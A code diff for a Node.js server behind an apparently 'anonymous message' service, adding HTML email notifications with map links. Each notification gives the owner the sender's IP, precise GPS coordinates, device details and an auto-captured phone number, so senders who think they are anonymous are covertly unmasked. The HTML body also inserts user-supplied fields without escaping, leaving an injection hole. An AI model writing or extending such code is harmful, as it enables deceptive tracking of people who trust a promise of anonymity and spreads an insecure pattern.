@@ -46,7 +46,7 @@ const resend = process.env.RESEND_API_KEY
 
 const MESSAGES_FILE = path.join(__dirname, 'messages.json');
 
-async function sendEmail(subject, text) {
+async function sendEmail(subject, text, html) {
   if (!resend) {
     console.log('Email disabled: RESEND_API_KEY not set');
     return;
@@ -57,7 +57,8 @@ async function sendEmail(subject, text) {
       from: process.env.FROM_EMAIL || 'onboarding@resend.dev',
       to: process.env.TO_EMAIL || 'isumuthsara2003@gmail.com',
       subject,
-      text
+      text,
+      html
     });
     console.log('Email notification sent');
   } catch (err) {
@@ -173,9 +174,14 @@ app.post('/message', async (req, res) => {
     // EMAIL (async, safe)
     const coord = newMessage.coordinates || {};
     const uaInfo = newMessage.userAgent || {};
-    sendEmail(
-      '📩 New Anonymous Message',
-      `
+    const mapsLink = (coord.latitude && coord.longitude)
+      ? `https://www.google.com/maps?q=${coord.latitude},${coord.longitude}`
+      : null;
+    const osmLink = (coord.latitude && coord.longitude)
+      ? `https://www.openstreetmap.org/?mlat=${coord.latitude}&mlon=${coord.longitude}#map=16/${coord.latitude}/${coord.longitude}`
+      : null;
+
+    const textBody = `
 Message: ${newMessage.message}
 Time (UTC): ${newMessage.timestamp}
 IP: ${newMessage.ip}
@@ -188,8 +194,30 @@ Referrer: ${newMessage.referrer}
 Source: ${newMessage.source}
 Share Tag: ${newMessage.shareTag ?? 'N/A'}
 Language: ${newMessage.language}${phoneAuto ? `\nPhone: ${phoneAuto}` : ''}
+${mapsLink ? `\nMap (Google): ${mapsLink}` : ''}
+${osmLink ? `\nMap (OpenStreetMap): ${osmLink}` : ''}
       `.trim()
-    );
+    const htmlBody = `
+      <div style="font-family: Arial, sans-serif; line-height: 1.5;">
+        <p><strong>Message:</strong> ${newMessage.message}</p>
+        <p><strong>Time (UTC):</strong> ${newMessage.timestamp}</p>
+        <p><strong>IP:</strong> ${newMessage.ip}</p>
+        <p><strong>Location:</strong> ${newMessage.location}</p>
+        <p><strong>Coordinates:</strong> ${coord.latitude ?? 'N/A'}, ${coord.longitude ?? 'N/A'} (±${coord.accuracy ?? 'N/A'}m)</p>
+        <p><strong>Browser:</strong> ${uaInfo.browser} ${uaInfo.browserVersion}</p>
+        <p><strong>OS:</strong> ${uaInfo.os} ${uaInfo.osVersion}</p>
+        <p><strong>Device:</strong> ${uaInfo.deviceType}</p>
+        <p><strong>Referrer:</strong> ${newMessage.referrer}</p>
+        <p><strong>Source:</strong> ${newMessage.source}</p>
+        <p><strong>Share Tag:</strong> ${newMessage.shareTag ?? 'N/A'}</p>
+        <p><strong>Language:</strong> ${newMessage.language}</p>
+        ${phoneAuto ? `<p><strong>Phone:</strong> ${phoneAuto}</p>` : ''}
+        ${mapsLink ? `<p><a href="${mapsLink}" target="_blank">View on Google Maps</a></p>` : ''}
+        ${osmLink ? `<p><a href="${osmLink}" target="_blank">View on OpenStreetMap</a></p>` : ''}
+      </div>
+    `;
+
+    sendEmail('📩 New Anonymous Message', textBody, htmlBody);
 
     res.status(201).json(newMessage);
   } catch (err) {
